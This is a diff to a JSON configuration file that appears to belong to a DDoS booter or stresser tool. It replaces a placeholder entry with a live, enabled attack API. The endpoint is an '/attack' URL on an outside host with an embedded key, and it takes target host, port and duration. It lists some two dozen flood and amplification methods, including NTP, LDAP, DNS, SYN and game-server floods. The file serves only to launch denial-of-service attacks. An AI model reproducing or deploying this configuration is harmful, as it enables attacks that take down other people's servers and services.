@@ -1,10 +1,10 @@
 {
-    "API_1": {
-        "use": false,
-        "url": "http://your_api.com/api.php?key=[KEY]&host=[HOST]&port=[PORT]&time=[TIME]&method=[METHOD]",
-        "max_time": 0,
-        "max_boot": 0,
-        "methods": ["UDP", "TCP"],
-        "cooldown": 0
+    "BlkYosh_API": {
+        "use": true,
+        "url": "http://blkyoshapi.com:8080/attack?key=Rn4SvJ3H0sQi&target=[HOST]&port=[PORT]&duration=[TIME]&method=[METHOD]",
+        "max_time": 500,
+        "max_boot": 3,
+        "methods": ["mixamp", "udp", "ntp", "ldap", "dns", "tcp", "killall", "ovh-tcp", "socket", "nfo", "ssh", "ovh-udp", "game", "udpmini", "fivem", "vse", "mc-drop", "roblox", "rawudp", "rawtcp", "std", "syn", "handshake"],
+        "cooldown": 10
     }
 }
